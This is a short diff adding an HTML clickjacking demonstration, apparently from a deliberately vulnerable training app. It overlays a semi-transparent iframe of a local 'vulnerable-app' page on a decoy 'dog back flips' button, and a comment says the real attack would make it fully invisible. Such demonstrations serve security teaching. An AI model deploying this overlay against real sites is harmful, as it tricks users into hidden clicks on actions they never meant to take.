@@ -1,0 +1,14 @@
+<section id="clickjacking-view" class="mainbar">
+    <style>
+    iframe { /* iframe from vulnerable-app */
+        width:1000px;
+        height:500px;
+        position:absolute;
+        top:0; left:0;
+        filter:alpha(opacity=50); /* in real life opacity=0 */
+        opacity:0.5;
+    }
+    </style>
+    <button style="z-index:-1;margin-top:195px;margin-left:320px;">Click to see awesome dog back flips!</button>
+    <iframe src="http://localhost:3000/clickjacking" width="800" height="400"></iframe>
+</section>
